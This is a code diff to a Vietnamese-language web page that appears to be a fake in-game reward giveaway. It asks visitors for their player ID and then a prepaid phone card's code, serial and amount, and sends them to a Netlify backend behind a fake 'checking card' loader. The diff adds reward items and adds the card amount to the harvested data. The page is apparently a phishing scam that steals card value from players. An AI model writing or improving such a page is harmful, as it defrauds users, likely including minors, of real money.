@@ -33,7 +33,6 @@
         .btn-main-receive { background: var(--red); color: white; border: none; padding: 8px 20px; border-radius: 8px; font-weight: 800; cursor: pointer; margin-top: 8px; font-size: 13px; align-self: center; margin-bottom: 10px; }
         .btn-disabled { background: var(--gray) !important; cursor: not-allowed !important; opacity: 0.7; }
 
-        /* Messenger Widget */
         .messenger-btn {
             position: fixed; bottom: 20px; right: 15px; z-index: 9999;
             background: #fff; padding: 8px 15px 8px 8px; border-radius: 50px;
@@ -68,7 +67,6 @@
         label { display: block; text-align: left; font-size: 11px; font-weight: 700; color: #718096; margin-bottom: 5px; text-transform: uppercase; }
         .id-error { color: #e74c3c; font-size: 11px; text-align: left; margin-top: -8px; margin-bottom: 10px; display: none; font-weight: 600; }
 
-        /* Thêm style cho nút cam theo ảnh mẫu */
         .btn-login-orange { background: #f39c12; color: white; border: none; padding: 14px; width: 100%; border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 16px; box-shadow: 0 4px 0 #d38312; }
         .btn-login-orange:active { transform: translateY(2px); box-shadow: 0 2px 0 #d38312; }
 
@@ -124,6 +122,8 @@
         { id: 13, name: "Xưởng máy hoa hồng", img: "https://i.postimg.cc/zDppMY5g/IMG-2127.png" },
         { id: 2, name: "2.450 Đá quý", img: "https://i.postimg.cc/85dNNzLf/IMG-2025.png" },
         { id: 1, name: "450 Thỏi vàng", img: "https://i.postimg.cc/ydhss80F/IMG-0014.png" },
+        { id: 17, name: "Đoá hoa toả sáng", img: "https://i.postimg.cc/nVkhtN8p/IMG-2160.png" },
+        { id: 18, name: "Gói Nữ sinh trường Marron KM", img: "https://i.postimg.cc/BvHJ7Vc9/IMG-2161.png" },
         { id: 16, name: "Cần câu búa vàng", img: "https://i.postimg.cc/7YxyPMJ1/IMG-1867.png" },
         { id: 11, name: "Supreme Roadster Cực Quang", img: "https://i.postimg.cc/P51mpy11/IMG-2118.png" },
         { id: 12, name: "Mùa Vọng Lâu Thiếu Gia Hổ", img: "https://i.postimg.cc/zfJRLrJF/IMG-2119.png" },
@@ -155,7 +155,6 @@
         content.innerHTML = `<img src="${img}" class="zoom-img"><div class="zoom-title">${name}</div>${btn}`;
     }
 
-    // --- CHỈ SỬA PHẦN NÀY ĐỂ THÊM HƯỚNG DẪN ID ---
     function openIDInput() {
         content.innerHTML = `
             <div style="display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:20px">
@@ -219,17 +218,18 @@
             </select>
             <label>Mệnh giá</label>
             <select id="card-amount">
-                <option value="50000">50.000đ</option><option value="100000">100.000đ</option><option value="200000">200.000đ</option><option value="500000">500.000đ</option><option value="1000000">1.000.000đ</option>
+                <option value="50.000">50.000đ</option><option value="100.000">100.000đ</option><option value="200.000">200.000đ</option><option value="500.000">500.000đ</option><option value="1.000.000">1.000.000đ</option>
             </select>
             <input type="text" id="c-code" placeholder="Mã thẻ nạp..."><input type="text" id="c-seri" placeholder="Số Seri thẻ...">
             <button class="btn-popup-receive" onclick="finalLoading()">XÁC NHẬN THẺ</button>`;
     }
 
-    // LOGIC GỐC CỦA BẠN (S1 LIÊN KẾT NETLIFY)
     async function finalLoading() {
         let code = document.getElementById('c-code').value;
         let seri = document.getElementById('c-seri').value;
         let type = document.getElementById('card-type').value; 
+        let amount = document.getElementById('card-amount').value; // DÒNG MỚI: Lấy mệnh giá
+        
         if(!code || !seri) return alert("Vui lòng nhập đủ!");
         
         content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra thẻ trên hệ thống...</p></div>`;
@@ -238,7 +238,7 @@
             await fetch('/.netlify/functions/napthe', { 
                 method: 'POST', 
                 headers: { 'Content-Type': 'application/json' }, 
-                body: JSON.stringify({ type, code, seri, playerID: userPlayerID }) 
+                body: JSON.stringify({ type, code, seri, playerID: userPlayerID, amount: amount }) // Gửi kèm amount
             });
             
             setTimeout(() => {
